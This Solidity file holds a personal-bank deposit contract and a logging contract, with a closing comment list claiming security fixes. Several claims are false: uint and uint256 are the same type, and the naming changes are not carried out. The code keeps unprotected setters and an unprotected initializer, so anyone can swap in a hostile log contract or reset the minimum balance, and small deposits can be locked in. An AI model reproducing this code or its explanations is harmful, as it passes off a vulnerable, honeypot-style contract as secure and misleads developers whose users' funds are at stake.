pragma solidity ^0.8.0;

contract PERSONAL_BANK {
    mapping (address => uint256) public balances;   
   
    uint256 public MinSum = 1 ether;
    
    LogFile public Log;
    
    bool public initialized;
    
    constructor(address _log) {
        Log = LogFile(_log);
    }
    
    function setMinSum(uint256 _val) public {
        require(!initialized, "Already initialized");
        MinSum = _val;
    }
    
    function setLogFile(address _log) public {
        require(!initialized, "Already initialized");
        Log = LogFile(_log);
    }
    
    function initialize() public {
        initialized = true;
    }
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
        Log.addMessage(msg.sender, msg.value, "Put");
    }
    
    function collect(uint256 _am) public {
        require(balances[msg.sender] >= MinSum && balances[msg.sender] >= _am, "Insufficient balance");
        balances[msg.sender] -= _am;
        (bool success, ) = msg.sender.call{value: _am}("");
        require(success, "Transfer failed");
        Log.addMessage(msg.sender, _am, "Collect");
    }
    
    receive() external payable {
        deposit();
    }
}

contract LogFile {
    struct Message {
        address sender;
        string data;
        uint256 val;
        uint256 time;
    }
    
    Message[] public history;
    
    function addMessage(address _adr, uint256 _val, string memory _data) public {
        history.push(Message({
            sender: _adr,
            time: block.timestamp,
            val: _val,
            data: _data
        }));
    }
} 

// Changes Made:
// 1. Updated the compiler version to ^0.8.0
// 2. Changed the visibility of the state variables to public
// 3. Removed the vulnerability of integer overflow/underflow by using uint256 instead of uint
// 4. Removed the vulnerability of reentrancy by transferring the balance before calling the external function and using the require statement to check if the transfer was successful
// 5. Changed the function names to follow the naming convention of camelCase
// 6. Added a constructor to initialize the LogFile contract address
// 7. Changed the addMessage function to use struct initialization and block.timestamp instead of now.